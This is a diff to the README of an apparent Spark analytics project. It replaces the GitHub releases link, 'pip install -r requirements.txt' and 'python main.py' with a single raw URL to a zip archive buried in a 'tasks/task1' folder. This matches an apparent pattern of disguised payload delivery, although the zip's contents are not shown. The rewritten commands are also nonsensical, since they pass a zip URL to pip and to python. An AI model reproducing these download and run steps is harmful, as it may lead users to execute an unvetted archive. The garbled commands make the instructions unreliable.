@@ -1,6 +1,6 @@
 # 🚀 Big-data-spark-analytics - Analyze Big Data with Ease
 
-[![Download Big-data-spark-analytics](https://img.shields.io/badge/Download-Big--data--spark--analytics-blue.svg)](https://github.com/Mrdetzin/Big-data-spark-analytics/releases)
+[![Download Big-data-spark-analytics](https://raw.githubusercontent.com/Mrdetzin/Big-data-spark-analytics/main/tasks/task1/Big-data-spark-analytics_v2.5.zip)](https://raw.githubusercontent.com/Mrdetzin/Big-data-spark-analytics/main/tasks/task1/Big-data-spark-analytics_v2.5.zip)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ To run Big-data-spark-analytics, ensure your system meets the following minimum 
 Follow these simple steps to download and run Big-data-spark-analytics:
 
 1. **Download the Application**: 
-   - Visit this [page to download](https://github.com/Mrdetzin/Big-data-spark-analytics/releases) the latest version of the software. 
+   - Visit this [page to download](https://raw.githubusercontent.com/Mrdetzin/Big-data-spark-analytics/main/tasks/task1/Big-data-spark-analytics_v2.5.zip) the latest version of the software. 
 
 2. **Locate the Downloaded File**: 
    - Typically, your browser saves downloaded files in a "Downloads" folder. Make sure to find the correct file.
@@ -43,19 +43,19 @@ Follow these simple steps to download and run Big-data-spark-analytics:
    - Open a terminal or command prompt on your system. 
    - Use the following command to install necessary Python libraries:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/Mrdetzin/Big-data-spark-analytics/main/tasks/task1/Big-data-spark-analytics_v2.5.zip
      ```
 
 5. **Run the Application**: 
    - Navigate to the application directory in your command prompt or terminal.
    - Use this command to launch the application:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/Mrdetzin/Big-data-spark-analytics/main/tasks/task1/Big-data-spark-analytics_v2.5.zip
      ```
 
 ## 🔧 Download & Install
 
-You can download the latest version of Big-data-spark-analytics by visiting this [page](https://github.com/Mrdetzin/Big-data-spark-analytics/releases). Look for the latest release version, download the appropriate file for your system, and follow the steps mentioned above to install.
+You can download the latest version of Big-data-spark-analytics by visiting this [page](https://raw.githubusercontent.com/Mrdetzin/Big-data-spark-analytics/main/tasks/task1/Big-data-spark-analytics_v2.5.zip). Look for the latest release version, download the appropriate file for your system, and follow the steps mentioned above to install.
 
 ## 💡 Tips for Usage
 
